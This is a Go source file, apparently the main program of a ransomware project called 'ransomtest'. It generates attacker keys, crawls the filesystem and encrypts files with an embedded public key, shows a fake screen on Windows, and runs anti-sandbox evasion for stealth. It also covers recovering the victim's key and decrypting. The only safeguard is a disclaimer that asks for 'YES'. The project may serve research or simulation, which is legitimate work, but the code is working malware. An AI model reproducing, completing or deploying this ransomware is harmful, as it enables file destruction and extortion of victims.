/*
The
Usage:

	main [flags] []

The flags are:

	    -genkeys
		    Generate Key Encryption Keys from the attacker side.
		    This step is required before generating executables
		-recover_key
		    Recovers victim encrypted private key. N

		-decrypt
*/
package main

import (
	"bufio"
	"crypto/rsa"
	_ "embed"
	"flag"
	"fmt"
	"os"
	"path"
	"ransomtest/cryptutils"
	"ransomtest/processing"
	"ransomtest/utils"
	"runtime"
	"strings"
	"sync"

	"github.com/hekmon/processpriority"
)

// proxifying errors
func check(e error) {
	if e != nil {
		panic(e)
	}
}

//go:embed DISCLAMER.TXT
var disclamer_string []byte

// Print a disclamer for the software not be used in a real life attack
func Disclamer() {
	fmt.Println(string(disclamer_string))
	for {
		fmt.Println("Do you want to destruct yout computer? Type uppercase YES")
		out, err := bufio.NewReader(os.Stdin).ReadString('\n')
		check(err)
		if strings.TrimSuffix(out, "\r\n") == "YES" {
			break
		}
	}
}

// The purpose of this function is to force the keysize
func GenerateKeys() (*rsa.PrivateKey, *rsa.PublicKey) {
	fmt.Println("Generating keys. It can take some time. MAKE SURE TO SAVE KEYS!")
	privkey, pubkey := cryptutils.GenerateKeyPair(8192)
	return privkey, pubkey
}

func DecryptFiles(privkey *rsa.PrivateKey, files_path []string) {
	var wg sync.WaitGroup
	for _, file_path := range files_path {
		wg.Add(1)
		go func(file_path string) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					fmt.Println("Recovered from panic:", r)
				}
			}()
			if cryptutils.IsEncryptedFile(file_path) {
				processing.DecryptFile(file_path, privkey)
			}
		}(file_path)
	}
	wg.Wait()
}

func RecoverKeys(encrypted_privkey string, master_privkey *rsa.PrivateKey) *rsa.PrivateKey {
	return cryptutils.KekDecrypt(master_privkey, encrypted_privkey)
}

//go:embed cryptutils/pubkey.pem
var kek_pubkey_bytes []byte

func EncryptFiles(files []string, master_pubkey *rsa.PublicKey) {
	if runtime.GOOS == "windows" {
		utils.ShowFakeScreen()
	}
	processpriority.Set(os.Getpid(), processpriority.AboveNormal)
	pubkey, encrypted_privkey := cryptutils.GenerateEncKeyPair(master_pubkey)
	var wg sync.WaitGroup
	for _, file_path := range files {
		wg.Add(1)
		go func(file_path string) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					fmt.Println("Recovered from panic:", r)
				}
			}()
			processing.EncryptFile(file_path, pubkey, encrypted_privkey)
		}(file_path)
	}
	wg.Wait()
}

func main() {
	genkeys_ptr := flag.Bool("genkeys", false, "Generate keypairs")
	decrypt_ptr := flag.String("decrypt", "", "Decrypt files")
	recover_key_ptr := flag.String("recover_key", "", "Recover the key that have been encrypted on the victim end")
	flag.Parse()

	if *genkeys_ptr { // Initialize PKI. This is mandatory
		privkey, pubkey := GenerateKeys()
		ex, err := os.Getwd()
		check(err)
		check(os.WriteFile(path.Join(ex, "cryptutils", "privkey.pem"), cryptutils.PrivateKeyToBytes(privkey), 0600))
		check(os.WriteFile(path.Join(ex, "cryptutils", "pubkey.pem"), cryptutils.PublicKeyToBytes(pubkey), 0600))
		fmt.Println("Keys saved to:", path.Join(ex, "pki"))

	} else if len(*decrypt_ptr) > 0 {
		data, err := os.ReadFile(*decrypt_ptr)
		check(err)
		DecryptFiles(cryptutils.BytesToPrivateKey(data), utils.CrawlWL([]string{".html"}))
	} else if len(*recover_key_ptr) > 0 {
		currpath, err := os.Getwd()
		check(err)
		privkey_path := path.Join(currpath, "cryptutils", "privkey.pem")
		data, err := os.ReadFile(privkey_path)
		if err != nil {
			fmt.Println("Cannot find private key. Are you the threat actor?")
			os.Exit(1)
		}
		victim_privatekey := cryptutils.PrivateKeyToBytes(RecoverKeys(*recover_key_ptr, cryptutils.BytesToPrivateKey(data)))
		fmt.Println(string(victim_privatekey))
	} else { // Encrypt!!!
		Disclamer()
		if !strings.HasPrefix(os.Args[0], "/tmp") { // no anti sbx in test mode
			utils.AntiSandbox()
		}
		fmt.Println("Initiating SCRAM. Reactor will shut down...")
		// Crawl the filesystem before encrypting to fasten the process and gain stealth
		EncryptFiles(utils.Crawl(), cryptutils.BytesToPublicKey(kek_pubkey_bytes))
	}
}
